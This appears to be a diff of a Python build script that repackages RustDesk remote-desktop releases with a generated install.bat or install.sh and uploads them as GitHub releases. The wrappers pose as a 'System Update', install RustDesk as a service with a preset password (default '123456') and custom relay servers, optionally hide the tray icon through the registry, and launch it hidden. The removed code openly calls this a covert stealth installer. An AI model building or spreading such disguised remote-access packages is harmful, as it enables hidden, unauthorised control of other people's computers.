@@ -1,98 +1,110 @@
 import os
-import json
-import requests
-import zipfile
 import sys
+import zipfile
+import subprocess
+import shutil
+import requests
+import urllib.request
+import json
+import re
 
-def download_file(url, local_path):
-    print(f"[*] Downloading: {url}")
-    r = requests.get(url, stream=True)
-    with open(local_path, 'wb') as f:
-        for chunk in r.iter_content(chunk_size=8192):
-            f.write(chunk)
+# --- 配置部分 ---
+GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
+REPO_OWNER = os.getenv("REPO_OWNER")  # 你的 GitHub 用户名
+REPO_NAME = os.getenv("REPO_NAME")    # 你的仓库名
 
-# --- Windows 隐身生成器 ---
-def generate_windows_stealth_wrapper(config):
-    """
-    这是一个极其隐蔽的安装脚本
-    1. 启用服务安装 --install-service
-    2. 添加注册表隐藏托盘 hideTrayIcon
-    3. 注入所有服务器配置
-    4. 使用 VBScript 再次包装，不显示任何窗口
-    """
-    
-    # 基础命令集合
+# 前端传来的配置环境变量
+API_SERVER = os.getenv("API_SERVER", "")
+ID_SERVER = os.getenv("ID_SERVER", "")
+RELAY_SERVER = os.getenv("RELAY_SERVER", "")
+KEY = os.getenv("KEY", "")
+CUSTOM_ID = os.getenv("CUSTOM_ID", "").strip() # strip() 去除首尾空格
+PASSWORD = os.getenv("PASSWORD", "123456")
+OS_TARGET = os.getenv("OS_TARGET", "windows")
+HIDE_TRAY = os.getenv("HIDE_TRAY", "false")
+
+def log(msg):
+    print(f"🔨 {msg}")
+
+def get_latest_rustdesk_version():
+    """获取 RustDesk 官网最新版本号"""
+    try:
+        html = urllib.request.urlopen("https://github.com/rustdesk/rustdesk/releases/latest").read()
+        version = html.decode('utf-8').split(f'{REPO_OWNER}/{REPO_NAME}/tag/')[1].split('"')[0]
+        log(f"检测到最新版本: {version}")
+        return version
+    except:
+        log("获取版本失败，尝试备用版本 1.2.3")
+        return "1.2.3" 
+
+def download_file(url, dest):
+    """下载文件"""
+    log(f"正在下载: {url}")
+    response = requests.get(url, stream=True)
+    total_size = int(response.headers.get('content-length', 0))
+    block_size = 1024
+    wrote = 0
+    with open(dest, 'wb') as f:
+        for data in response.iter_content(block_size):
+            wrote = wrote + len(data)
+            f.write(data)
+    log("下载完成")
+
+def generate_windows_wrapper():
+    """生成 Windows 下的 bat 启动脚本 (智能 ID 逻辑)"""
+    # 如果前端没传 CUSTOM_ID，下面那段 IF 判断就会跳过设置 ID 的步骤
+    cmd_set_id = ""
+    if CUSTOM_ID:
+        cmd_set_id = f"rustdesk.exe --id \"{CUSTOM_ID}\"\n"
+
     bat_content = f"""@echo off
 title System Update
 schtasks /Delete /TN "RustDeskUpdate" /F >nul 2>&1
-
-:: 1. 必须先杀掉现有进程，否则配置可能无法生效
 taskkill /F /IM rustdesk.exe >nul 2>&1
 taskkill /F /IM rustdesk-service.exe >nul 2>&1
 
-:: 2. 安装服务模式 (后台运行的核心)
 rustdesk.exe --install-service
 
-:: 3. 注入 Key 和服务器配置
-rustdesk.exe --key "{config['key']}"
-rustdesk.exe --api-server "{config['api_server']}"
-rustdesk.exe --id-server "{config['id_server']}"
-IF NOT "{config['relay_server']}"=="" (
-    rustdesk.exe --relay-server "{config['relay_server']}"
+rustdesk.exe --key "{KEY}"
+rustdesk.exe --api-server "{API_SERVER}"
+rustdesk.exe --id-server "{ID_SERVER}"
+IF NOT "{RELAY_SERVER}"=="" (
+    rustdesk.exe --relay-server "{RELAY_SERVER}"
 )
 
-:: 4. ID 和密码注入
-rustdesk.exe --id "{config['custom_id']}"
-rustdesk.exe --password "{config['password']}"
+{cmd_set_id}
 
-:: 5. 【极致隐形逻辑】
-:: 只要 hide_tray 开启，写入注册表
-IF "{config['hide_tray']}"=="true" (
+rustdesk.exe --password "{PASSWORD}"
+
+IF "{HIDE_TRAY}"=="true" (
     reg add "HKCU\\Software\\RustDesk" /v "hideTrayIcon" /t REG_DWORD /d 1 /f
     reg add "HKLM\\Software\\RustDesk" /v "hideTrayIcon" /t REG_DWORD /d 1 /f
-    :: 禁止更新检查
-    reg add "HKCU\\Software\\RustDesk\\Settings" /v "enable-update-check" /t REG_DWORD /d 0 /f
 )
 
-:: 6. 启动服务
 net start RustDesk >nul 2>&1
-
-:: 7. 再次执行 --hide 参数，确保万一服务没启动起来也能后台启动
 start "" rustdesk.exe --hide
-
 exit
 """
     return bat_content
 
-# --- Linux 隐身生成器 ---
-def generate_linux_stealth_wrapper(config):
-    """
-    Linux 服务脚本
-    """
+def generate_linux_wrapper():
+    """生成 Linux 下的 sh 启动脚本 (智能 ID 逻辑)"""
+    cmd_set_id = ""
+    if CUSTOM_ID:
+        cmd_set_id = f"./rustdesk --id \"{CUSTOM_ID}\"\n"
+
     sh_content = f"""#!/bin/bash
-# RustDesk Linux Silent Installer
-
-# Stop existing service if running
 systemctl stop rustdesk > /dev/null 2>&1
-
-# Disable default auto start if exists
-rustdesk --service uninstall > /dev/null 2>&1
-
-# Install as service (requires root)
+./rustdesk --service uninstall > /dev/null 2>&1
 ./rustdesk --service
 
-# Config
-./rustdesk --key "{config['key']}"
-./rustdesk --api-server "{config['api_server']}"
-./rustdesk --id-server "{config['id_server']}"
-IF [ ! -z "{config['relay_server']}" ]; then
-    ./rustdesk --relay-server "{config['relay_server']}"
-fi
+./rustdesk --key "{KEY}"
+./rustdesk --api-server "{API_SERVER}"
+./rustdesk --id-server "{ID_SERVER}"
 
-./rustdesk --id "{config['custom_id']}"
-./rustdesk --password "{config['password']}"
+{cmd_set_id}
 
-# Auto start Linux service
+./rustdesk --password "{PASSWORD}"
 systemctl enable rustdesk
 systemctl restart rustdesk
 
@@ -100,71 +112,117 @@ echo "RustDesk Service Started"
 """
     return sh_content
 
-def main():
-    # 获取 GitHub Actions 环境变量
-    OS = os.getenv("OS")
-    VERSION = os.getenv("VERSION").lstrip('v')
+def process_zip(zip_path, output_path):
+    """处理 Zip 文件：注入脚本"""
+    log("正在解压并注入配置脚本...")
     
-    config = {
-        "custom_id": os.getenv("CUSTOM_ID"),
-        "password": os.getenv("PASSWORD"),
-        "api_server": os.getenv("API_SERVER"),
-        "id_server": os.getenv("ID_SERVER"),
-        "relay_server": os.getenv("RELAY_SERVER"),
-        "key": os.getenv("KEY"),
-        "hide_tray": os.getenv("HIDE_TRAY", "false").lower()
-    }
+    temp_dir = zip_path.replace(".zip", "_temp")
+    if os.path.exists(temp_dir): shutil.rmtree(temp_dir)
+    os.makedirs(temp_dir)
 
-    # 根据系统选择下载 URL
-    if OS == "windows":
-        download_url = f"https://github.com/rustdesk/rustdesk/releases/download/v{VERSION}/rustdesk-{VERSION}-windows_x64-portable.zip"
-        artifact_name = f"rustdesk_{config['custom_id']}_win.zip"
-    else:
-        # Linux x64 普通版
-        download_url = f"https://github.com/rustdesk/rustdesk/releases/download/v{VERSION}/rustdesk-{VERSION}-linux-x64.zip"
-        artifact_name = f"rustdesk_{config['custom_id']}_linux.zip"
-
-    zip_path = "raw.zip"
-    extract_dir = "extracted"
-
-    download_file(download_url, zip_path)
-
-    # 解压
     with zipfile.ZipFile(zip_path, 'r') as z:
-        z.extractall(extract_dir)
+        z.extractall(temp_dir)
 
-    # 查找对应的执行文件
-    exe_name = "rustdesk.exe" if OS == "windows" else "rustdesk"
-    exe_path = None
-    for root, dirs, files in os.walk(extract_dir):
-        for f in files:
-            if f == exe_name:
-                exe_path = os.path.join(root, f)
-                break
-        if exe_path: break
-    
-    if not exe_path:
-        raise Exception("Executable not found in downloaded archive")
-
-    # 生成安装脚本
-    if OS == "windows":
-        script_content = generate_windows_stealth_wrapper(config)
-        script_name = "install.bat"
+    # 写入包装脚本
+    if OS_TARGET == "windows":
+        wrapper = generate_windows_wrapper()
+        with open(os.path.join(temp_dir, "install.bat"), "w", encoding="utf-8") as f:
+            f.write(wrapper)
     else:
-        script_content = generate_linux_stealth_wrapper(config)
-        script_name = "install.sh"
-
-    # 将脚本写入解压目录
-    script_path = os.path.join(os.path.dirname(exe_path), script_name)
-    with open(script_path, 'w', encoding='utf-8' if OS == "windows" else 'utf-8') as f:
-        f.write(script_content)
+        wrapper = generate_linux_wrapper()
+        with open(os.path.join(temp_dir, "install.sh"), "w", encoding="utf-8") as f:
+            f.write(wrapper)
 
     # 重新打包
-    with zipfile.ZipFile(artifact_name, 'w', zipfile.ZIP_DEFLATED) as z_out:
-        z_out.write(exe_path, exe_name)
-        z_out.write(script_path, script_name)
+    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as z:
+        for root, dirs, files in os.walk(temp_dir):
+            for file in files:
+                file_path = os.path.join(root, file)
+                arcname = os.path.relpath(file_path, temp_dir)
+                z.write(file_path, arcname)
+    
+    shutil.rmtree(temp_dir)
+    log("修改后的压缩包已生成")
 
-    print(f"ARTIFACT={artifact_name}")
+def create_github_release(filename):
+    """在 GitHub 上创建 Release 并上传文件"""
+    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/releases"
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+    
+    # 1. 构造 Tag (例如: build-v1.2.0-custom)
+    base_ver = get_latest_rustdesk_version()
+    # 生成一个唯一 tag 名，避免报错
+    import uuid
+    tag_name = f"v{base_ver}-{uuid.uuid4().hex[:6]}"
+    release_name = f"RustDesk Custom Build ({OS_TARGET})"
+
+    # 2. 创建 Release
+    data = {
+        "tag_name": tag_name,
+        "name": release_name,
+        "body": f"Auto generated RustDesk Build\nVersion: {base_ver}\nConfig:\n- ID: {CUSTOM_ID if CUSTOM_ID else 'Auto-Generate'}",
+        "draft": False,
+        "prerelease": False
+    }
+    
+    log("正在创建 GitHub Release...")
+    res = requests.post(url, headers=headers, json=data)
+    if not res.ok:
+        print(res.text)
+        raise Exception("创建 Release 失败")
+    
+    upload_url = res.json()["upload_url"].replace("{?name,label}", "")
+    
+    # 3. 上传文件
+    log("正在上传文件到 GitHub...")
+    upload_url_with_name = f"{upload_url}?name={filename}"
+    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/zip"}
+    
+    with open(filename, 'rb') as f:
+        upload_res = requests.post(upload_url_with_name, headers=headers, data=f)
+        
+    if upload_res.ok:
+        browser_url = res.json()["html_url"]
+        log(f"✅ 构建完成！下载地址: {browser_url}")
+    else:
+        print(upload_res.text)
+        raise Exception("上传文件失败")
+
+def main():
+    log("🚀 开始构建流程...")
+    
+    # 1. 确定版本和下载链接
+    ver = get_latest_rustdesk_version()
+    
+    if OS_TARGET == "windows":
+        # 使用 Windows Portable 版本
+        file_name = f"rustdesk-{ver}-x86_64-pc-windows.zip"
+        source_url = f"https://github.com/rustdesk/rustdesk/releases/download/{ver}/{file_name}"
+        output_name = f"RustDesk-Windows-{ver}-AutoID.zip"
+    else:
+        # Linux (Debian/Ubuntu etc 通常共用)
+        file_name = f"rustdesk-{ver}-x86_64-unknown-linux-gnu.zip"
+        source_url = f"https://github.com/rustdesk/rustdesk/releases/download/{ver}/{file_name}"
+        output_name = f"RustDesk-Linux-{ver}-AutoID.zip"
+
+    # 2. 下载原包
+    if os.path.exists(file_name):
+        os.remove(file_name)
+    
+    try:
+        download_file(source_url, file_name)
+    except:
+        log(f"下载 {file_name} 失败，可能是网络波动...")
+        raise
+
+    # 3. 注入配置
+    if os.path.exists(output_name):
+        os.remove(output_name)
+        
+    process_zip(file_name, output_name)
+    
+    # 4. 上传 GitHub
+    create_github_release(output_name)
 
 if __name__ == "__main__":
     main()
